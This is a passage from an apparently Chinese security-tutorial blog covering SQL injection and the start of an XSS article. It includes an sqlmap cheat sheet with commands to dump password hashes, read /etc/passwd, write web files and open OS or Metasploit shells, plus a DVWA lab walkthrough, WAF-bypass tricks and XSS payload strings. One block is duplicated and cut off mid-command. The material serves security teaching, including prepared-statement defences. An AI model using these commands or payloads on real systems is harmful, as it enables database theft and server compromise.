class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line"></span><br><span class="line">常用语句 :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="line">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;</span><br></pre></td></tr></table></figure><p>简单的注入流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br></pre></td></tr></table></figure><p>确定要注入的URL，有时需要获取访问该网站所需的cookie。</p><h3 id="get数据注入-1"><a href="#get数据注入-1" class="headerlink" title="get数据注入"></a>get数据注入</h3><ul><li><p>查询所有的数据库名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; --dbs</span><br></pre></td></tr></table></figure></li><li><p>查询指定数据库的所有表名信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa --table</span><br></pre></td></tr></table></figure></li><li><p>查询指定表名下的所有列名信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users --column</span><br></pre></td></tr></table></figure></li><li><p>查询指定数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure></li></ul><h3 id="post数据注入-1"><a href="#post数据注入-1" class="headerlink" title="post数据注入"></a>post数据注入</h3><p>使用 SQLMap 自动完成 POST 注入，需要把正常 POST 包的内容复制到一个 txt 文档，再调用文档来进行注入。</p><p>先使用 Burpsuite 拦截正常 POST 包，右键 - 选择 Copy to file 复制到 &#x2F;root&#x2F;post.txt</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618182311836.jpg" alt="img" style="zoom: 33%;"><p>然后关闭 Burpsuite 的代理功能，再使用命令 <code>sqlmap -r /root/post.txt --dbs</code>，来查询数据库名称。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618184176609.jpg" alt="img" style="zoom:33%;"><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa --table</code>，查询表名</p><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users --columns</code>，查询字段名</p><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users -C user,password --dump</code>，查询用户名和密码内容</p><h2 id="8-SQL注入防护"><a href="#8-SQL注入防护" class="headerlink" title="8. SQL注入防护"></a>8. SQL注入防护</h2><h3 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h3><p>addslashes()、魔术引号开关、mysql_real_escape_string</p><p><u>会对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义</u>，会影响SQL注入语句中的路径信息。</p><p><strong>绕过方法</strong>：</p><p>宽字节（待转义字符前加上%df）、</p><h3 id="整数过滤"><a href="#整数过滤" class="headerlink" title="整数过滤"></a>整数过滤</h3><p>遇到 is_int() 函数过滤输入的情况：直接跑路，无法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ni shi ge jj?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>str_replace(‘被过滤参数’,’过滤参数’,$id)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_</span> GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_</span> GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 第一个参数是要过滤的值，第二个参数是过滤后的值</span></span><br><span class="line"><span class="variable">$id</span>=str_ <span class="title function_ invoke__">replace</span>(<span class="string">&#x27;select&#x27;</span> , <span class="string">&#x27;fuck&#x27;</span> ,<span class="variable">$id</span>)</span><br><span class="line"><span class="comment">// logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>-<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤效果：select变成了fuck</p><h3 id="waf防护软件"><a href="#waf防护软件" class="headerlink" title="waf防护软件"></a>waf防护软件</h3><p>阿里云盾、安全狗、宝塔</p><p>作用机制：过滤关键字</p><p><strong>绕过方法</strong>：</p><ol><li><p>更改提交方法（get、post）</p></li><li><p><strong>大小写混合</strong>（绕开黑名单）</p></li><li><p><strong>解密编码类</strong>（绕开黑名单）</p><p>%0A为换行符；%23为#号；%20为空格</p></li><li><p><strong>注释符号混用</strong>（绕开注释过滤）</p><p>比如<code>/**/</code>、<code>/*!*/</code></p></li><li><p>等价函数替换（绕开关键字过滤）</p></li><li><p>特殊符号混用（绕开关键字过滤）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空格被过滤，用%a0代替；</span><br><span class="line">and和or被过滤：可以用&amp;&amp;和||来替代；</span><br></pre></td></tr></table></figure></li><li><p>借助数据库特性（多种SQL语句）</p></li><li><p><strong>HTTP参数污染</strong></p><p>函数java_implimentation()的逻辑有严重错误： 一旦这个数组里的个数不止1个，并且每个组员都是id开头，那么返回只会返回第一个组员。比如id&#x3D;1&amp;id&#x3D;sql_injection的结果为为id&#x3D;1。但是<code>$id=$_GET[&#39;id&#39;]</code>取的是最后一个id，所以我们只需要把payload放在后面的id就好。</p></li><li><p><strong>垃圾数据溢出</strong></p><p>waf只能匹配一千个，多了就不行了</p></li></ol><h3 id="使用预编译PDO"><a href="#使用预编译PDO" class="headerlink" title="使用预编译PDO"></a>使用预编译PDO</h3><p>PDO 是 PHP Data Objects（PHP 数据对象）的缩写。是在 PHP5.1 版本之后开始支持的技术。不使用 PDO 技术时，SQL 语句是先在本地拼接完成后，再传递至数据库处理，所以会导致用户提交有猫腻的变量来改变原 SQL 语句的结构，从而实现 SQL 注入；使用 PDO 技术后，是<strong>先把 SQL 语句的整体语法，匹配的参数用 <code>?</code> 当做占位符一起发送至数据库，然后再把用户提交的查询参数发送至数据库，由数据库来完成变量的转移处理。</strong>用户输入只会被当成字符串字面值参数，而SQL语句则经过语法分析，生成执行命令。这样 SQL 语句的整体语法结构和变量分开两次传递至数据库，从而导致那些有猫腻的变量无法再改变 SQL 语句的原始结构。这种情况下，SQL 注入攻击几乎无法实现。这也是目前比较有效的防御 SQL 注入攻击的方法之一。</p><p>SQL关键字<strong>无法进行预编译</strong>，如表名或者列名字段，order by + 列名，in + 列名。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/2476579/1</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://frankcao3.github.io/posts/7933"/>
    <id>https://frankcao3.github.io/posts/7933</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:00:44.303Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1628132918301-6d92440b-aa98-4275-a9bf-b7f7658b568a.png?x-oss-process=image/resize,w_908/resize,w_750,limit_0" alt="img"></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XSS 攻击全称跨站脚本攻击Cross Site Scripting。是指用户<u>在 Web 页面中提交恶意脚本，从而使浏览包含恶意脚本的页面的用户在不知情的情况下执行该脚本</u>，导致被攻击的行为。通常出现在<u>搜索框、留言板、评论区</u>等地方。</p><p>与 SQL 注入类似，XSS 也是利用提交恶意信息来实现攻击效果的攻击行为。但是 <u>XSS 一般提交的是 Javascript 脚本</u>，<u><strong>运行在 Web 前端</strong></u>，也就是用户的浏览器；而 SQL 注入提交的 SQL 指令是在后台数据库服务器执行。所以两者攻击的对象是不一样的。</p><p><strong>攻击流程如下：</strong></p><ul><li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li><li>诱使受害者打开受到攻击的服务器URL。</li><li>受害者在Web浏览器中打开URL，恶意脚本执行。</li></ul><p><strong>本质</strong>：前端对于用户提交的参数没有审查就用于页面加载；</p><p><strong>产生层面</strong>：前端，浏览器；攻击目标是通过前端脚本获取用户的数据。</p><p><strong>XSS常用的函数类</strong>：输出类：echo printf print print_r sprintf die var-dump var_export</p><p><strong>攻击成功与否受浏览器内核影响</strong>。一些高版本浏览器内核会主动过滤恶意脚本，阻止XSS攻击。</p><p>通常，在XSS攻击中，攻击者会通过邮件或其他方式诱使用户点击包含恶意代码的链接，例如攻击者通过E-mail向用户发送一个包含恶意代码的网站home.com，用户点击链接后，浏览器会在用户毫不知情的情况下执行链接中包含的恶意代码，将用户与home.com交互的Cookie和Session等信息发送给攻击者，攻击者拿到这些数据之后，就会伪装成用户与真正的网站进行会话，从事非法活动，其过程如下图所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1618208947784_xss%E8%B7%A8%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.jpg" alt="1618208947784_xss跨脚本攻击.jpg"></p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>受JS脚本的功能决定。</p><ol><li><p><strong>挂马、挖矿</strong></p></li><li><p><strong>盗取用户Cookie。</strong></p></li><li><p>DOS（拒绝服务）客户端浏览器。</p></li><li><p><strong>钓鱼攻击</strong>，高级的钓鱼技巧。</p></li><li><p><strong>恶意篡改页面。</strong></p></li><li><p><strong>劫持用户Web行为</strong>，甚至进一步渗透内网。</p></li><li><p>爆发Web2.0<strong>蠕虫</strong>。</p></li><li><p>蠕虫式的DDoS攻击。</p></li><li><p>蠕虫式挂马攻击、<strong>植入广告，或者发送垃圾信息、刷浏量</strong>、破坏网上数据</p></li><li><p>其它安全问题</p></li></ol><h2 id="常用攻击语句"><a href="#常用攻击语句" class="headerlink" title="常用攻击语句"></a>常用攻击语句</h2><p>一般会借助HTML标签的一些触发事件来执行攻击脚本。</p><ul><li><p><strong>script标签</strong></p><p>在 HTML 页面中插入一段 JavaScript：</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p></li><li><p><strong>img标签</strong></p><p>img标签支持 <strong>onerror</strong> 事件属性，在装载文档或图像的过程中如果发生了错误，就会触发<strong>onerror</strong>事件。利用<strong>onerror</strong>的特性来完成XSS。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>svg标签</strong></p><p>svg标签支持 <strong>onload</strong> 时间属性，页面结束加载之后触发。</p><p><code>&lt;svg onload=alert(1)&gt;</code></p></li><li><p><strong>超链接标签</strong></p><p>解析href所指链接，此处作用是发生动作时执行一段javascript代码。</p><p><code>&lt;a href=javascript:alert(1)&gt;&lt;/a&gt;</code></p></li><li><p><strong>audio标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">href</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>video标签</strong></p><p><code>&lt;video src=x onerror=prompt(1);&gt;</code></p></li><li><p><strong>div标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/1/))&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span>     ie浏览器执行</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>%<span class="attr">3d</span>&#x27;<span class="attr">alert</span>%<span class="attr">26lpar</span>%<span class="attr">3b1</span>%<span class="attr">26rpar</span>%<span class="attr">3b</span>&#x27;&gt;</span>DIV&lt;%2fdiv&gt;   url编码绕过</span><br></pre></td></tr></table></figure></li><li><p><strong>math标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span>&lt;a/xlink:href=javascript:prompt(1)&gt;Xss</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span> <span class="attr">href</span>=<span class="string">&quot;javascript:javascript:alert(1)&quot;</span>&gt;</span>Xss<span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>button标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;button/onclick=alert(1) &gt;xss<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>keygen标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen/onfocus=prompt(1);&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>object标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"></span><br><span class="line">base64</span><br><span class="line">编码：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg    </span><br><span class="line">解码：<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>iframe标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">width</span>%<span class="attr">3d</span>&quot;<span class="attr">420</span>&quot; <span class="attr">height</span>%<span class="attr">3d</span>&quot;<span class="attr">315</span>&quot; <span class="attr">frameborder</span>%<span class="attr">3d</span>&quot;<span class="attr">0</span>&quot; <span class="attr">onload</span>%<span class="attr">3d</span>&quot;<span class="attr">alert</span>(<span class="attr">document.cookie</span>)&quot;&gt;</span>&lt;%2fIFRAME&gt;</span><br><span class="line">&lt;iframe%2fsrc%3d&quot;data%3atext%2fhtml%3b%26Tab%3bbase64%26Tab%3b,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3d%3d&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>%<span class="attr">3d</span>&#x27;%<span class="attr">26lt</span>%<span class="attr">3bbody</span> <span class="attr">onload</span>%<span class="attr">3dprompt</span>%<span class="attr">26lpar</span>%<span class="attr">3b1</span>%<span class="attr">26rpar</span>%<span class="attr">3b</span>%<span class="attr">26gt</span>%<span class="attr">3b</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反弹型-XSS（非持续型）"><a href="#反弹型-XSS（非持续型）" class="headerlink" title="反弹型 XSS（非持续型）"></a>反弹型 XSS（非持续型）</h3><p>过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php（XSS在前端执行）&#x3D;&gt; 回包</p><p>反射型 XSS 是指恶意的<u>攻击脚本包含在 <strong>URL</strong> 中</u>，<u>只有当用户主动访问了包含恶意脚本的 URL，脚本才会被成功执行</u>。反射型的攻击，<strong>攻击脚本经过后台服务器，但是不会写入网站的数据库，是一次性的攻击</strong>，所以黑客一般需要诱骗用户点击包含攻击脚本的 URL（钓鱼邮件），才能攻击成功。</p><p>比如在get请求中构造攻击语句，输出用户在该网站的cookie：</p><p><code>?name=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>（name参数为数值的话就不加引号）</p><p>该语句输出到页面的HTML就变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163239269.png" alt="image-20220728163239269"></p><h3 id="存储型-XSS（持续型）"><a href="#存储型-XSS（持续型）" class="headerlink" title="存储型 XSS（持续型）"></a>存储型 XSS（持续型）</h3><p>过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php &#x3D;&gt; XSS被写入数据库 &#x3D;&gt; 他人访问页面执行index.php &#x3D;&gt; 回包（XSS在前端被执行） </p><p>存储型 XSS 则是<u>把攻击脚本提交到网站 